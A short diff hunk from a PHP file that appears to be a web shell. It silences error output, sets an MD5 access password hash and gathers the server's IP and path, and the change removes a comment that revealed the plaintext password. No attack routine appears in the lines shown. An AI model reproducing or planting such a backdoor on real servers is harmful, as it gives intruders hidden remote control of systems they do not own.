@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "ceb639e524aed3bfe4eba77d7e703b16";//WOcao667
+$password = "ceb639e524aed3bfe4eba77d7e703b16";
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
